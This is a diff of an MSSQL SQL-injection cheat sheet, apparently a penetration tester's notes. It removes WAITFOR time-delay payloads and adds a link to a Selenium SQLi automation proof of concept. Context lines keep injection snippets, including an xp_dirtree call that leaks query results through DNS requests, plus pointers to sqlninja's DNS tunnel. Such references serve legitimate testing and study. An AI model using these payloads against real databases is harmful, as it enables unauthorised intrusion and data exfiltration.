@@ -178,11 +178,7 @@ SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END - returns 1
 ```bash
 SELECT char(65)+char(66) - returns AB
 ```
-### Time Delay:
-```bash
-WAITFOR DELAY '0:0:5' - pause for 5 seconds
-WAITFOR DELAY '00:01:00' - pause for 1 minute
-```
+
 ### Make DNS Requests:
 - priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
 - Also check out theDNS tunnel feature of sqlninja http://sqlninja.sourceforge.net/sqlninja-howto.html
@@ -302,10 +298,11 @@ SELECT @T = (SELECT REPLACE(@e, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.BR
 ### Password Cracker:
 MSSQL 2000 and 2005 Hashes are both SHA1-based.  
 
-
-
+### Scripts:
+[Selenium SQLi automation](https://raw.githubusercontent.com/bleubyte/Selenium_sqli.py/main/main.py) - Needs more work Done, I had scripted this as a POC. The site was using some sort of Javascript token that would only accept clicking on submit in order to work. Burp/SQLIMAP failed
 ### Resources:
 [Pentest Monkeys Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 [Port Swigger SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
 ### other resources add not included
 [Sqlninja's MSSQL Cheat Sheet](http://sqlninja.sourceforge.net/sqlninja-howto.html#ss2.13)
